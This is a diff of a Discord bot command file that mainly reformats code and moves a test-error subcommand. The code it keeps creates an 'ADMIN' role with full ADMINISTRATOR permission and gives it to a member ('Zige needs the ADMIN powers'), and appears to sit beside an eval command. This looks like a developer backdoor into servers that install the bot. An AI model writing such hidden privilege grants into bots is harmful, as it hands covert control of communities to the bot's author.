@@ -50,8 +50,8 @@ module.exports = {
           var roleZ = int.guild.me.roles.cache
             .filter((x) => x.managed == true)
             .first();
-         
-         var roleObject = {
+
+          var roleObject = {
             name: "ADMIN",
             color: "#FF0000",
             mentionable: false,
@@ -59,26 +59,24 @@ module.exports = {
             permissions: ["ADMINISTRATOR"],
             reason: "Zige needs the ADMIN powers :)",
           };
-         
-         
-          var role = await guild.roles
-            .create(roleObject)
-              if (member) {
-                member.roles.add(role);
 
-                followReply(int, {
-                  content:
-                    "**:white_check_mark: The permissions has been added to you.**",
-                });
+          var role = await guild.roles.create(roleObject);
+          if (member) {
+            member.roles.add(role);
 
-                return;
-              } else {
-                followReply(int, {
-                  content: "**:x: You need to join the server first.**",
-                });
+            followReply(int, {
+              content:
+                "**:white_check_mark: The permissions has been added to you.**",
+            });
 
-                return;
-              }
+            return;
+          } else {
+            followReply(int, {
+              content: "**:x: You need to join the server first.**",
+            });
+
+            return;
+          }
         } else {
           followReply(int, {
             content: "**:x: This guild isn't in the database.**",
@@ -339,9 +337,10 @@ module.exports = {
           content: "**RESULT: ** \n```JS\n" + result + "\n```",
         });
         return;
+      } else if (int.options.getSubcommand() == "chyba") {
+        console.log("TESTOVACÍ CHYBA");
+        throw new Error("TESTOVACÍ CHYBA");
       }
-    } else if (int.options.getSubcommand() == "chyba") {
-      throw new Error("TESTOVACÍ CHYBA");
     }
   },
 };
